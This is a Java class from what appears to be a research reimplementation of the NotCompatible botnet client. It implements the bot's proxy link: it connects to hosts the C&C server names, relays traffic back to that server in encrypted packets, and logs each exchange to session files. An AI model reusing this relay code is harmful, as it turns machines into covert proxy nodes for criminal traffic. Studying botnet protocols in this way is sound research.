package diff.notcompatible.c.bot.net.tcp;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.channels.SelectionKey;
import java.nio.channels.Selector;
import java.nio.channels.SocketChannel;
import java.util.logging.Logger;

import diff.notcompatible.c.bot.net.ThreadServer;
import diff.notcompatible.c.bot.objects.Packet;

public class ProxyLink extends TCPSocket {

    private final static Logger LOGGER = Logger.getLogger("session");

    public int ch;
    private Selector selector;
    private ThreadServer owner;

    public ProxyLink(ThreadServer newOwner) {
        selector = null;
        owner = newOwner;
        selector = owner.nio.selector;
    }

    public void connect(String dom, int port) {
        try {
            channel = SocketChannel.open();
            channel.configureBlocking(false);
            channel.connect(new InetSocketAddress(dom, port));
            if (selector != null) {
                selfKey = channel.register(selector, 8);
                selfKey.attach(this);
                owner.nio.register(this);
            }
        } catch (IOException exception) {
            try {
                onNoConnect(selfKey);
            } catch (IOException exception2) {
                exception2.printStackTrace();
            }
        }
    }

    /**
     * Links to other close using the private selfKey
     */
    public void close() {
        try {
            onClose(selfKey);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Close the ProxyLink and announce this channel is available for usage to C&C
     */
    @Override
    public void onClose(SelectionKey key) throws IOException {
        super.onClose(key);

        LOGGER.info(" [*] Closing ProxyLink with channel id [ " + ch + " ]  and announcing availability to C&C.");

        channel.close();
        owner.socks.proxyList.delete(this);
        Packet discoveryPacket = new Packet();
        discoveryPacket.tag = "DISC";

        Packet channelPacket = discoveryPacket.add();
        channelPacket.tag = "CH";
        channelPacket.buffer.putDword(ch);

        owner.socks.sendEncrypt(discoveryPacket.pack());
    }

    /**
     * Accept connection and announce to C&C
     */
    @Override
    public void onConnect(SelectionKey key) throws IOException {
        super.onConnect(key);

        Packet connectPacket = new Packet();
        connectPacket.tag = "CONN";

        Packet channelPacket = connectPacket.add();
        channelPacket.tag = "CH";
        channelPacket.buffer.putDword(ch);

        Packet portPacket = connectPacket.add();
        portPacket.tag = "PORT";
        portPacket.buffer.putPort(channel.socket().getLocalPort());

        owner.socks.sendEncrypt(connectPacket.pack());
    }

    /**
     * Announce NoConnection to C&C
     */
    @Override
    public void onNoConnect(SelectionKey key) throws IOException {
        super.onNoConnect(key);

        LOGGER.info(" [*] NoConnection ProxyLink with channel id [ " + ch + " ] announcing availability to C&C.");

        Packet noConnectionPacket = new Packet();
        noConnectionPacket.tag = "NOCN";

        Packet channelPacket = noConnectionPacket.add();
        channelPacket.tag = "CH";
        channelPacket.buffer.putDword(ch);

        owner.socks.sendEncrypt(noConnectionPacket.pack());
    }

    @Override
    public void onRead(SelectionKey key) throws IOException {
        super.onRead(key);

        Packet readPacket = new Packet();
        readPacket.tag = "RECV";

        Packet packetChannel = readPacket.add();
        packetChannel.tag = "CH";
        packetChannel.buffer.putDword(ch);

        Packet dataTransferPacket = readPacket.add();
        dataTransferPacket.tag = "DT";
        dataTransferPacket.buffer.put(this.readBuffer.array());

        readBuffer.clear();

        LOGGER.info(" [+] Data read from ProxyLink channel [ " + ch + " ] with data length of [ "
                        + dataTransferPacket.buffer.array().length + " ] ");

        writeData(channel.socket().getInetAddress().getHostName(), channel.socket().getPort(), "read",
                        dataTransferPacket.buffer.array());

        owner.socks.sendEncrypt(readPacket.pack());
    }

    @Override
    public void send(byte[] src) throws IOException {
        super.send(src);

        writeData(channel.socket().getInetAddress().getHostName(), channel.socket().getPort(), "write", src);
    }

    private void writeData(String hostName, int port, String type, byte[] dataTransferPacket) {
        try {
            long currentTime = System.currentTimeMillis();
            File proxyLinkDirectory = new File(owner.sessionDirectory + "/" + hostName + "/" + port + "/");
            proxyLinkDirectory.mkdirs();
            File proxyReadData = new File(proxyLinkDirectory.getPath() + "/" + currentTime + "." + type);
            DataOutputStream file = new DataOutputStream(new FileOutputStream(proxyReadData));

            file.write(dataTransferPacket);

            file.flush();
            file.close();
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }

}
